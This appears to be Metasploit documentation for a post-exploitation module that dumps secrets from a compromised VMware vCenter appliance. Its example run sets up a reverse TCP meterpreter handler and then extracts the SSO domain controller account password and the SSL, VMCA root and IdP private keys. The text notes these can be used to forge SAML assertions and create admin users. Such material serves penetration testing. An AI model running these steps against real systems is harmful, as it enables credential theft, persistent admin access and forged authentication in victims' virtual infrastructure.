Grab secrets and keys from the vCenter server and add them to loot. Secrets include the dcAccountDN
and dcAccountPassword for the vCenter machine which can be used for maniuplating the SSO domain via
standard LDAP interface; good for plugging into the vmware_vcenter_vmdir_ldap module or for adding
new SSO admin users. The MACHINE_SSL, VMCA_ROOT and SSO IdP certificates with assocaited private keys
are also plundered and can be used to sign forged SAML assertions for the /ui admin interface.

## Vulnerable Application
This module is tested against the vCenter appliance only; it will not work on Windows vCenter
instances. It is intended to be run after successfully acquiring root access on a vCenter appliance
and is useful for penetrating further into the environment following a vCenter exploit that results
in a root shell. This module has been tested against vCenter appliance versions 7.0 and 6.7 but will
probably work against other versions of vCenter appliance.

## Verification Steps
This is a post module and requires a meterpreter or shell session on the vCenter appliance with root
access.

1. Start msfconsole
2. Get session on vCenter appliance via exploit of your choice and background it
3. Do: `use post/linux/gather/vcenter_secrets_dump`
4. Do: `set session <session>`
15. Do: `dump`

## Options
**SESSION**

Which session to use, which can be viewed with `sessions -l`

## Scenarios
Example run from meterpreter session on vCenter appliance version 7.0.2

```
msf6 > use multi/handler
set payload linux/x86/meterpreter/reverse_tcp
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload linux/x86/meterpreter/reverse_tcp
payload => linux/x86/meterpreter/reverse_tcp
set LPORT 4444
msf6 exploit(multi/handler) > set LHOST 192.168.101.10
LHOST => 192.168.101.10
msf6 exploit(multi/handler) > set LPORT 4444
LPORT => 4444
msf6 exploit(multi/handler) > exploit

[*] Started reverse TCP handler on 192.168.101.10:4444 
[*] Sending stage (989032 bytes) to 192.168.100.11
[*] Meterpreter session 1 opened (192.168.101.10:4444 -> 192.168.100.11:53410 ) at 2022-04-17 19:04:00 -0400

meterpreter > bg
[*] Backgrounding session 1...
msf6 exploit(multi/handler) > use post/linux/gather/vcenter_secrets_dump
msf6 post(linux/gather/vcenter_secrets_dump) > set session 1
session => 1
msf6 post(linux/gather/vcenter_secrets_dump) > dump

[*] Gathering vSphere SSO Domain Information ...
[*] Extracting dcAccountDN and dcAccountPassword via lwregshell on local vCenter ...
[+] vSphere SSO DC DN: cn=vcenter.cesium137.io,ou=Domain Controllers,dc=vsphere,dc=local
[+] vSphere SSO DC PW: St"7qMYCj)V#PnwS\mw2
[*] Extracting certificates from vSphere platform ...
[*] Fetching objectclass=vmwSTSTenantCredential via vmdir LDAP ...
[*] Parsing vmwSTSTenantCredential certificates and keys ...
[*] Validated vSphere SSO IdP certificate against vSphere IDM tenant certificate
[+] => CHA-CHING! <=
[+] MACHINE_SSL_KEY: /home/cs137/.msf4/loot/20220417190437_default_192.168.100.11_ssl_120856.key
[+] MACHINE_SSL_CERT: /home/cs137/.msf4/loot/20220417190437_default_192.168.100.11_ssl_144111.pem
[+] VMCA_ROOT_KEY: /home/cs137/.msf4/loot/20220417190437_default_192.168.100.11_vmca_345006.key
[+] VMCA_ROOT_CERT: /home/cs137/.msf4/loot/20220417190437_default_192.168.100.11_vmca_676785.pem
[+] SSO_STS_IDP_KEY: /home/cs137/.msf4/loot/20220417190437_default_192.168.100.11_idp_668987.key
[+] SSO_STS_IDP_CERT: /home/cs137/.msf4/loot/20220417190437_default_192.168.100.11_idp_126310.pem
[*] Post module execution completed
```
